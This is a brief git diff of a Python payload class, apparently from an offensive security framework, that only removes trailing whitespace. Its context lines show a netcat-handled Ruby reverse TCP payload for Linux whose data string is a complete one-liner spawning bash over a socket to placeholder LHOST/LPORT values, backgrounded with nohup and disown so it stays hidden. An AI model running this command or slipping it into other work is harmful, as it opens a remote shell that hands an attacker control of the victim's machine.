@@ -12,7 +12,7 @@ class Payload:
     meta = {
         'handler' : 'netcat',
         'type' : 'ruby-reverse-tcp',
-        'os' : 'linux'  
+        'os' : 'linux'
     }
 
     config = {}
@@ -24,4 +24,4 @@ class Payload:
     attrs = {}
 
     data = "nohup ruby -rsocket -e 'spawn(\"bash\",[:in,:out,:err]=>TCPSocket.new(\"*LHOST*\",*LPORT*))' > /dev/null 2>&1 & disown"
-    
+
